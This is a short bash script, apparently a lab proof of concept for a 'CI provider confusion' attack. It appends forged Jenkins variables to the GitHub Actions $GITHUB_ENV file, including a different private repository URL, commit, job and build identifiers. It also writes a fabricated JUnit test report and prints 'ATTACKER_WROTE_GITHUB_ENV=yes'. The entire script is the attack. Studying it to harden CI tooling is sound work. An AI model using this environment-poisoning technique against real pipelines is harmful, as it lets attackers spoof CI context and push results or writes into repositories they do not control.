#!/usr/bin/env bash
set -euo pipefail
[[ -z "${MERGIFY_TOKEN:-}" ]]
cat >> "$GITHUB_ENV" <<'ENV'
JENKINS_URL=https://jenkins.invalid/vm3-provider-confusion
GIT_URL=https://github.com/livastic-vm3-mergify-lab-0911/vm3-private-ci-acl-lab-20260913.git
GIT_BRANCH=main
CHANGE_TARGET=main
GIT_COMMIT=aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
JOB_NAME=vm3-provider-confusion-crossrepo-260927
BUILD_ID=vm3-provider-confusion-build-260927
BUILD_URL=https://jenkins.invalid/job/vm3-provider-confusion/1
NODE_NAME=vm3-provider-confusion-node
ENV
cat > vm3-provider-confusion-260927.xml <<'XML'
<testsuite name="vm3-provider-confusion-suite" tests="1" failures="0">
  <testcase classname="vm3.provider.confusion" name="crossrepo_write_260927" time="0.01"/>
</testsuite>
XML
echo 'ATTACKER_WROTE_GITHUB_ENV=yes'
